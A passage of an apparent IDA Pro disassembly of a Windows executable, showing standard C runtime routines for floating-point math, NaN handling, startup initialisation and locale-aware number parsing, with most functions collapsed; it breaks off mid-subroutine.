; [0000002F BYTES: COLLAPSED CHUNK OF FUNCTION __ffexpm1. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; ---------------------------------------------------------------------------

__rtinfpop:
		fstp	st

__rtinfnpop:
		fstp	st
		fld	tbyte_4301F0

setOVERFLOW:
		mov	byte ptr [ebp-90h], 3
		retn
; ---------------------------------------------------------------------------

_rtforexpinf:
		or	cl, cl
		jnz	short tranzeronpop
		fstp	st
		fld	tbyte_4301F0
		retn
; [00000043 BYTES: COLLAPSED FUNCTION __ffexpm1. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000034 BYTES: COLLAPSED FUNCTION _isintTOS. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

_usepowhlp:
		push	esi
		sub	esp, 74h
		mov	esi, esp
		push	esi
		sub	esp, 8
		fstp	qword ptr [esp]
		sub	esp, 8
		fstp	qword ptr [esp]
		fsave	byte ptr [esi+8]
		call	__powhlp
		add	esp, 14h
		frstor	byte ptr [esi+8]
		fld	qword ptr [esi]
		add	esp, 74h
		pop	esi
		test	eax, eax
		jz	short noerror
		jmp	__rttosnpopde
; ---------------------------------------------------------------------------

noerror:				; CODE XREF: .text:00418C4Fj
		retn
; ---------------------------------------------------------------------------
		align 10h
; [0000003E BYTES: COLLAPSED FUNCTION __cintrindisp2. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000003D BYTES: COLLAPSED FUNCTION __cintrindisp1. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000048 BYTES: COLLAPSED FUNCTION __ctrandisp2. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000007 BYTES: COLLAPSED FUNCTION ctranexit. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000147 BYTES: COLLAPSED FUNCTION cintrinexit. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000033 BYTES: COLLAPSED FUNCTION __ctrandisp1. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000003C BYTES: COLLAPSED FUNCTION __fload. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000018 BYTES: COLLAPSED FUNCTION __CIlog_pentium4.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
; [00000006 BYTES: COLLAPSED CHUNK OF FUNCTION _log. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000024E BYTES: COLLAPSED FUNCTION start_2. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [00000067 BYTES: COLLAPSED FUNCTION __trandisp1. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000008C BYTES: COLLAPSED FUNCTION __trandisp2. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

__rttospopde:
		call	__rttosnpopde

__rttospop:				; CODE XREF: .text:expretj
		fxch	st(1)

__rtnospop:				; CODE XREF: .text:00419252j
		fstp	st

__rttosnpop:
		retn
; ---------------------------------------------------------------------------

__rtnospopde:
		call	__rttosnpopde
		jmp	short __rtnospop
; ---------------------------------------------------------------------------

__rtzeropop:
		fstp	st
; [00000005 BYTES: COLLAPSED CHUNK OF FUNCTION __ffexpm1. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; ---------------------------------------------------------------------------

__rtonepop:				; CODE XREF: .text:_rtfor0to0j
					; .text:_rtforyto0j
		fstp	st

__rtonenpop:
		fstp	st
		fld1
		retn
; ---------------------------------------------------------------------------

__tosnan1:
		fstp	tbyte ptr [ebp-9Eh]
		fld	tbyte ptr [ebp-9Eh]
		test	byte ptr [ebp-97h], 40h
		jz	short _tossnan1
		mov	byte ptr [ebp-90h], 7
		retn
; ---------------------------------------------------------------------------

_tossnan1:				; CODE XREF: .text:00419275j
		mov	byte ptr [ebp-90h], 1
		fadd	dbl_430264
		retn
; ---------------------------------------------------------------------------

__nosnan2:
		fxch	st(1)

__tosnan2:
		fstp	tbyte ptr [ebp-9Eh]
		fld	tbyte ptr [ebp-9Eh]
		test	byte ptr [ebp-97h], 40h
		jz	short _tossnan2
		mov	byte ptr [ebp-90h], 7
		jmp	short _tosnan2ret
; ---------------------------------------------------------------------------

_tossnan2:				; CODE XREF: .text:004192A2j
		mov	byte ptr [ebp-90h], 1

_tosnan2ret:				; CODE XREF: .text:004192ABj
		faddp	st(1), st
		retn
; ---------------------------------------------------------------------------

__nan2:
		fstp	tbyte ptr [ebp-9Eh]
		fld	tbyte ptr [ebp-9Eh]
		test	byte ptr [ebp-97h], 40h
		jz	short _snan2
		fxch	st(1)
		fstp	tbyte ptr [ebp-9Eh]
		fld	tbyte ptr [ebp-9Eh]
		test	byte ptr [ebp-97h], 40h
		jz	short _snan2
		mov	byte ptr [ebp-90h], 7
		jmp	short _nan2ret
; ---------------------------------------------------------------------------

_snan2:					; CODE XREF: .text:004192CAj
					; .text:004192E1j
		mov	byte ptr [ebp-90h], 1

_nan2ret:				; CODE XREF: .text:004192EAj
		faddp	st(1), st
		retn
; ---------------------------------------------------------------------------

__rtindfpop:				; CODE XREF: .text:negYTOXerrorj
		fstp	st

__rtindfnpop:				; CODE XREF: .text:tranindfnpopj
		fstp	st
		fld	tbyte_430250
		cmp	byte ptr [ebp-90h], 0
		jg	short retj
; [0000000A BYTES: COLLAPSED FUNCTION __rttosnpopde. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

__rtchsifneg:
		or	cl, cl
		jz	short chsifnegret
		fchs

chsifnegret:				; CODE XREF: .text:00419315j
		retn
; ---------------------------------------------------------------------------
		align 10h
; [00000015 BYTES: COLLAPSED FUNCTION __twoToTOS. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000017 BYTES: COLLAPSED FUNCTION __load_CW. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000019 BYTES: COLLAPSED FUNCTION __convertTOStoQNaN. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000043 BYTES: COLLAPSED FUNCTION __fload_withFB. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000016 BYTES: COLLAPSED FUNCTION __checkTOS_withFB. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
; [0000000D BYTES: COLLAPSED CHUNK OF FUNCTION _pow. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
; [0000002A BYTES: COLLAPSED CHUNK OF FUNCTION _log. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------

__check_overflow_exit:
		sub	esp, 8
		fst	qword ptr [esp]
		mov	eax, [esp+4]
		add	esp, 8
		and	eax, 7FF00000h
		jmp	short _check_overflow_start
; [000000A3 BYTES: COLLAPSED FUNCTION __check_range_exit. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
		align 10h
; [00000017 BYTES: COLLAPSED FUNCTION __startTwoArgErrorHandling. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000003C BYTES: COLLAPSED FUNCTION __startOneArgErrorHandling. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
		align 10h
; [00000019 BYTES: COLLAPSED FUNCTION __CIpow_pentium4.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000B38 BYTES: COLLAPSED FUNCTION __pow_pentium4. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [00000066 BYTES: COLLAPSED FUNCTION __d_inttype. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000140 BYTES: COLLAPSED FUNCTION __powhlp.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000042 BYTES: COLLAPSED FUNCTION __CxxUnhandledExceptionFilter(_EXCEPTION_POINTERS	*). PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_41A258	proc near		; DATA XREF: .rdata:00424410o
		push	offset ?__CxxUnhandledExceptionFilter@@YGJPAU_EXCEPTION_POINTERS@@@Z ; lpTopLevelExceptionFilter
		call	ds:SetUnhandledExceptionFilter
		xor	eax, eax
		retn
sub_41A258	endp

; [00000030 BYTES: COLLAPSED FUNCTION __crt_waiting_on_module_handle. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000029 BYTES: COLLAPSED FUNCTION __amsg_exit. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000002B BYTES: COLLAPSED FUNCTION ___crtCorExitProcess. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000017 BYTES: COLLAPSED FUNCTION ___crtExitProcess. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 2
; [00000009 BYTES: COLLAPSED FUNCTION __lockexit. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000009 BYTES: COLLAPSED FUNCTION __unlockexit. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000001D BYTES: COLLAPSED FUNCTION __initterm. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [00000024 BYTES: COLLAPSED FUNCTION __initterm_e. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000085 BYTES: COLLAPSED FUNCTION __cinit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000012C BYTES: COLLAPSED FUNCTION _doexit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000016 BYTES: COLLAPSED FUNCTION _exit. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000016 BYTES: COLLAPSED FUNCTION __exit. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000000F BYTES: COLLAPSED FUNCTION __cexit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000000F BYTES: COLLAPSED FUNCTION __c_exit.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000004E BYTES: COLLAPSED FUNCTION __init_pointers. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [000001AB BYTES: COLLAPSED FUNCTION __NMSG_WRITE. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000039 BYTES: COLLAPSED FUNCTION __FF_MSGBANNER. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000160 BYTES: COLLAPSED FUNCTION __XcptFilter. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000005F BYTES: COLLAPSED FUNCTION __wincmdln. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [000000DE BYTES: COLLAPSED FUNCTION __setenvp. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000019A BYTES: COLLAPSED FUNCTION _parse_cmdline. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000BB BYTES: COLLAPSED FUNCTION __setargv. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000137 BYTES: COLLAPSED FUNCTION ___crtGetEnvironmentStringsA. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000254 BYTES: COLLAPSED FUNCTION __ioinit.	PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_41AFFF	proc near		; CODE XREF: ___tmainCRTStartup:loc_416645p
		mov	edi, edi
		push	esi
		mov	eax, offset dword_42A750
		mov	esi, offset dword_42A750
		push	edi
		mov	edi, eax
		cmp	eax, esi
		jnb	short loc_41B022

loc_41B013:				; CODE XREF: sub_41AFFF+21j
		mov	eax, [edi]
		test	eax, eax
		jz	short loc_41B01B
		call	eax

loc_41B01B:				; CODE XREF: sub_41AFFF+18j
		add	edi, 4
		cmp	edi, esi
		jb	short loc_41B013

loc_41B022:				; CODE XREF: sub_41AFFF+12j
		pop	edi
		pop	esi
		retn
sub_41AFFF	endp


; =============== S U B	R O U T	I N E =======================================


; void __cdecl sub_41B025()
sub_41B025	proc near		; DATA XREF: __cinit+41o
		mov	edi, edi
		push	esi
		mov	eax, offset dword_42A758
		mov	esi, offset dword_42A758
		push	edi
		mov	edi, eax
		cmp	eax, esi
		jnb	short loc_41B048

loc_41B039:				; CODE XREF: sub_41B025+21j
		mov	eax, [edi]
		test	eax, eax
		jz	short loc_41B041
		call	eax

loc_41B041:				; CODE XREF: sub_41B025+18j
		add	edi, 4
		cmp	edi, esi
		jb	short loc_41B039

loc_41B048:				; CODE XREF: sub_41B025+12j
		pop	edi
		pop	esi
		retn
sub_41B025	endp

; [00000072 BYTES: COLLAPSED FUNCTION __encode_pointer.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000009 BYTES: COLLAPSED FUNCTION __encoded_null. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000072 BYTES: COLLAPSED FUNCTION __decode_pointer.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000009 BYTES: COLLAPSED FUNCTION __crtTlsAlloc(x).	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000034 BYTES: COLLAPSED FUNCTION ___set_flsgetvalue. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000003D BYTES: COLLAPSED FUNCTION __mtterm.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000E7 BYTES: COLLAPSED FUNCTION __initptd. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000079 BYTES: COLLAPSED FUNCTION __getptd_noexit. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION __getptd.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000012F BYTES: COLLAPSED FUNCTION _freefls(x). PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000018D BYTES: COLLAPSED FUNCTION __mtinit.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000096 BYTES: COLLAPSED FUNCTION ___security_init_cookie. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [0000002D BYTES: COLLAPSED FUNCTION _strrchr.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000002F BYTES: COLLAPSED FUNCTION _CPtoLCID. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000064 BYTES: COLLAPSED FUNCTION setSBCS(threadmbcinfostruct *). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000193 BYTES: COLLAPSED FUNCTION setSBUpLow(threadmbcinfostruct *). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000A4 BYTES: COLLAPSED FUNCTION ___updatetmbcinfo. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000007C BYTES: COLLAPSED FUNCTION getSystemCP(int).	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000001E5 BYTES: COLLAPSED FUNCTION __setmbcp_nolock.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000016A BYTES: COLLAPSED FUNCTION __setmbcp. PRESS KEYPAD CTRL-"+" TO EXPAND]
; ---------------------------------------------------------------------------
		jmp	short loc_41BD69
; ---------------------------------------------------------------------------
; [0000002E BYTES: COLLAPSED CHUNK OF FUNCTION __setmbcp. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000001E BYTES: COLLAPSED FUNCTION ___initmbctable. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000149 BYTES: COLLAPSED FUNCTION ___freetlocinfo. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [0000008F BYTES: COLLAPSED FUNCTION ___addlocaleref. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000099 BYTES: COLLAPSED FUNCTION ___removelocaleref. PRESS	KEYPAD CTRL-"+"	TO EXPAND]
; [0000003E BYTES: COLLAPSED FUNCTION __updatetlocinfoEx_nolock. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000076 BYTES: COLLAPSED FUNCTION ___updatetlocinfo. PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41C0B5	proc near		; CODE XREF: __init_pointers+17p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	dword_44EB54, eax
		pop	ebp
		retn
sub_41C0B5	endp

; [00000128 BYTES: COLLAPSED FUNCTION __invoke_watson. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000026 BYTES: COLLAPSED FUNCTION __invalid_parameter. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [00000051 BYTES: COLLAPSED FUNCTION __isdigit_l. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000002E BYTES: COLLAPSED FUNCTION _isdigit.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000115 BYTES: COLLAPSED FUNCTION __tolower_l. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000002C BYTES: COLLAPSED FUNCTION _tolower.	PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41C3D2(int, int, struct localeinfo_struct *)
sub_41C3D2	proc near		; CODE XREF: __fassign_l+17p

var_28		= byte ptr -28h
var_24		= byte ptr -24h
var_1C		= dword	ptr -1Ch
var_18		= byte ptr -18h
var_14		= dword	ptr -14h
var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		mov	eax, ___security_cookie
		xor	eax, ebp
		mov	[ebp+var_4], eax
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		push	[ebp+arg_8]	; struct localeinfo_struct *
		mov	edi, [ebp+arg_4]
		lea	ecx, [ebp+var_24] ; this
		call	??0_LocaleUpdate@@QAE@PAUlocaleinfo_struct@@@Z ; _LocaleUpdate::_LocaleUpdate(localeinfo_struct	*)
		lea	eax, [ebp+var_24]
		push	eax
		xor	ebx, ebx
		push	ebx
		push	ebx
		push	ebx
		push	ebx
		push	edi
		lea	eax, [ebp+var_28]
		push	eax
		lea	eax, [ebp+var_10]
		push	eax
		call	___strgtold12_l
		mov	[ebp+var_14], eax
		lea	eax, [ebp+var_10]
		push	esi
		push	eax
		call	sub_41F8B8
		add	esp, 28h
		test	byte ptr [ebp+var_14], 3
		jnz	short loc_41C451
		cmp	eax, 1
		jnz	short loc_41C43C

loc_41C42B:				; CODE XREF: sub_41C3D2+89j
		cmp	[ebp+var_18], bl
		jz	short loc_41C437
		mov	eax, [ebp+var_1C]
		and	dword ptr [eax+70h], 0FFFFFFFDh

loc_41C437:				; CODE XREF: sub_41C3D2+5Cj
		push	3

loc_41C439:				; CODE XREF: sub_41C3D2+7Dj
		pop	eax
		jmp	short loc_41C46B
; ---------------------------------------------------------------------------

loc_41C43C:				; CODE XREF: sub_41C3D2+57j
		cmp	eax, 2
		jnz	short loc_41C45D

loc_41C441:				; CODE XREF: sub_41C3D2+83j
		cmp	[ebp+var_18], bl
		jz	short loc_41C44D
		mov	eax, [ebp+var_1C]
		and	dword ptr [eax+70h], 0FFFFFFFDh

loc_41C44D:				; CODE XREF: sub_41C3D2+72j
		push	4
		jmp	short loc_41C439
; ---------------------------------------------------------------------------

loc_41C451:				; CODE XREF: sub_41C3D2+52j
		test	byte ptr [ebp+var_14], 1
		jnz	short loc_41C441
		test	byte ptr [ebp+var_14], 2
		jnz	short loc_41C42B

loc_41C45D:				; CODE XREF: sub_41C3D2+6Dj
		cmp	[ebp+var_18], bl
		jz	short loc_41C469
		mov	eax, [ebp+var_1C]
		and	dword ptr [eax+70h], 0FFFFFFFDh

loc_41C469:				; CODE XREF: sub_41C3D2+8Ej
		xor	eax, eax

loc_41C46B:				; CODE XREF: sub_41C3D2+68j
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		xor	ecx, ebp
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
sub_41C3D2	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl sub_41C47A(int, int, struct localeinfo_struct *)
sub_41C47A	proc near		; CODE XREF: __fassign_l+30p

var_28		= byte ptr -28h
var_24		= byte ptr -24h
var_1C		= dword	ptr -1Ch
var_18		= byte ptr -18h
var_14		= dword	ptr -14h
var_10		= byte ptr -10h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		mov	eax, ___security_cookie
		xor	eax, ebp
		mov	[ebp+var_4], eax
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		push	edi
		push	[ebp+arg_8]	; struct localeinfo_struct *
		mov	edi, [ebp+arg_4]
		lea	ecx, [ebp+var_24] ; this
		call	??0_LocaleUpdate@@QAE@PAUlocaleinfo_struct@@@Z ; _LocaleUpdate::_LocaleUpdate(localeinfo_struct	*)
		lea	eax, [ebp+var_24]
		push	eax
		xor	ebx, ebx
		push	ebx
		push	ebx
		push	ebx
		push	ebx
		push	edi
		lea	eax, [ebp+var_28]
		push	eax
		lea	eax, [ebp+var_10]
		push	eax
		call	___strgtold12_l
		mov	[ebp+var_14], eax
		lea	eax, [ebp+var_10]
		push	esi
		push	eax
		call	sub_41FDFC
		add	esp, 28h
		test	byte ptr [ebp+var_14], 3
		jnz	short loc_41C4F9
		cmp	eax, 1
		jnz	short loc_41C4E4

loc_41C4D3:				; CODE XREF: sub_41C47A+89j
		cmp	[ebp+var_18], bl
		jz	short loc_41C4DF
		mov	eax, [ebp+var_1C]
		and	dword ptr [eax+70h], 0FFFFFFFDh

loc_41C4DF:				; CODE XREF: sub_41C47A+5Cj
		push	3

loc_41C4E1:				; CODE XREF: sub_41C47A+7Dj
		pop	eax
		jmp	short loc_41C513
; ---------------------------------------------------------------------------

loc_41C4E4:				; CODE XREF: sub_41C47A+57j
		cmp	eax, 2
		jnz	short loc_41C505

loc_41C4E9:				; CODE XREF: sub_41C47A+83j
		cmp	[ebp+var_18], bl
		jz	short loc_41C4F5
		mov	eax, [ebp+var_1C]
		and	dword ptr [eax+70h], 0FFFFFFFDh

loc_41C4F5:				; CODE XREF: sub_41C47A+72j
		push	4
		jmp	short loc_41C4E1
; ---------------------------------------------------------------------------

loc_41C4F9:				; CODE XREF: sub_41C47A+52j
		test	byte ptr [ebp+var_14], 1
		jnz	short loc_41C4E9
		test	byte ptr [ebp+var_14], 2
		jnz	short loc_41C4D3

loc_41C505:				; CODE XREF: sub_41C47A+6Dj
		cmp	[ebp+var_18], bl
		jz	short loc_41C511
		mov	eax, [ebp+var_1C]
		and	dword ptr [eax+70h], 0FFFFFFFDh

loc_41C511:				; CODE XREF: sub_41C47A+8Ej
		xor	eax, eax

loc_41C513:				; CODE XREF: sub_41C47A+68j
		mov	ecx, [ebp+var_4]
		pop	edi
		pop	esi
		xor	ecx, ebp
		pop	ebx
		call	@__security_check_cookie@4 ; __security_check_cookie(x)
		leave
		retn
sub_41C47A	endp

; ---------------------------------------------------------------------------
		align 10h
; [00000365 BYTES: COLLAPSED FUNCTION _memcpy_0. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [0000008B BYTES: COLLAPSED FUNCTION _strlen. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000068 BYTES: COLLAPSED FUNCTION _strcpy_s. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000BF BYTES: COLLAPSED FUNCTION __fptostr. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [000000BD BYTES: COLLAPSED FUNCTION ___dtold.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000090 BYTES: COLLAPSED FUNCTION __fltout2. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000000F BYTES: COLLAPSED FUNCTION __security_check_cookie(x). PRESS	KEYPAD CTRL-"+"	TO EXPAND]
		align 10h
; [000000DF BYTES: COLLAPSED FUNCTION __alldvrm. PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [0000007A BYTES: COLLAPSED FUNCTION _memset. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [0000001F BYTES: COLLAPSED FUNCTION __aullshr. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000009 BYTES: COLLAPSED FUNCTION __fptrap.	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000006C BYTES: COLLAPSED FUNCTION __controlfp_s. PRESS KEYPAD CTRL-"+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_41CDA4	proc near		; CODE XREF: __init_pointers+11p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	dword_44EB5C, eax
		pop	ebp
		retn
sub_41CDA4	endp

; [00000060 BYTES: COLLAPSED FUNCTION ___crtInitCritSecAndSpinCount. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000045 BYTES: COLLAPSED FUNCTION __malloc_crt. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000004C BYTES: COLLAPSED FUNCTION __calloc_crt. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000004E BYTES: COLLAPSED FUNCTION __realloc_crt. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000087 BYTES: COLLAPSED FUNCTION _fastcopy_I. PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [000000E3 BYTES: COLLAPSED FUNCTION __VEC_memcpy. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000090 BYTES: COLLAPSED FUNCTION __local_unwind4. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000046 BYTES: COLLAPSED FUNCTION __unwind_handler4. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [0000001C BYTES: COLLAPSED FUNCTION _seh_longjmp_unwind4(x). PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000017 BYTES: COLLAPSED FUNCTION _EH4_CallFilterFunc(x,x).	PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000019 BYTES: COLLAPSED FUNCTION _EH4_TransferToHandler(x,x). PRESS KEYPAD	CTRL-"+" TO EXPAND]
; [0000001A BYTES: COLLAPSED FUNCTION _EH4_GlobalUnwind(x). PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000017 BYTES: COLLAPSED FUNCTION _EH4_LocalUnwind(x,x,x,x). PRESS KEYPAD CTRL-"+" TO EXPAND]
		align 10h
; [00000035 BYTES: COLLAPSED FUNCTION __ValidateImageBase. PRESS KEYPAD	CTRL-"+" TO EXPAND]
		align 10h
; [00000044 BYTES: COLLAPSED FUNCTION __FindPESection. PRESS KEYPAD CTRL-"+" TO	EXPAND]
		align 10h
; [000000BD BYTES: COLLAPSED FUNCTION __IsNonwritableInCurrentImage. PRESS KEYPAD CTRL-"+" TO EXPAND]
; [00000050 BYTES: COLLAPSED FUNCTION _has_osfxsr_set. PRESS KEYPAD CTRL-"+" TO	EXPAND]
; [00000062 BYTES: COLLAPSED FUNCTION __get_sse2_info. PRESS KEYPAD CTRL-"+" TO	EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_41D3AF	proc near		; DATA XREF: .rdata:00424408o
		call	__get_sse2_info
		mov	dword_44F0B8, eax
		xor	eax, eax
		retn
sub_41D3AF	endp

; [0000027C BYTES: COLLAPSED FUNCTION ___libm_error_support. PRESS KEYPAD CTRL-"+" TO EXPAND]
off_41D638	dd offset loc_41D59F	; DATA XREF: ___libm_error_support+1DCr
		dd offset loc_41D5A8	; jump table for switch	statement
		dd offset loc_41D5B1
		dd offset loc_41D5BA
		dd offset loc_41D5C3
		dd offset loc_41D5CC
		dd offset loc_41D557
		dd offset loc_41D5D8
		dd offset loc_41D541
		dd offset loc_41D538
		dd offset loc_41D5E4
		dd offset loc_41D5ED
		dd offset loc_41D5F6
		align 10h
; [00000117 BYTES: COLLAPSED FUNCTION unknown_libname_1. PRESS KEYPAD CTRL-"+" TO EXPAND]
		db 83h
		dd 0E0832CECh, 8524FF3Fh, 430A2Eh

; =============== S U B	R O U T	I N E =======================================


sub_41D794	proc near		; DATA XREF: .data:00430A2Eo
		fdiv	st, st
		add	esp, 2Ch
		retn
sub_41D794	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
word_41D79A	dw 0C483h		; DATA XREF: .data:00430A2Eo
; ---------------------------------------------------------------------------
		sub	al, 0CDh
		push	es

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 2

sub_41D79F	proc near		; DATA XREF: .data:00430A2Eo
		fdivr	st, st
		add	esp, 2Ch
		retn
sub_41D79F	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
byte_41D7A5	db 83h,	0C4h, 2Ch	; DATA XREF: .data:00430A2Eo
		db 0CDh, 6

; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 4

sub_41D7AA	proc near		; DATA XREF: .data:00430A2Eo
		fdiv	st, st
		add	esp, 2Ch
		retn
sub_41D7AA	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 5

sub_41D7B0	proc near		; DATA XREF: .data:00430A2Eo
		fdivp	st, st
		add	esp, 2Ch
		retn
sub_41D7B0	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 6

sub_41D7B6	proc near		; DATA XREF: .data:00430A2Eo
		fdivr	st, st
		add	esp, 2Ch
		retn
sub_41D7B6	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 7

sub_41D7BC	proc near		; DATA XREF: .data:00430A2Eo
		fdivrp	st, st
		add	esp, 2Ch
		retn
sub_41D7BC	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; jumptable 0041D78D case 8

sub_41D7C2	proc near		; DATA XREF: .data:00430A2Eo

arg_8		= tbyte	ptr  0Ch
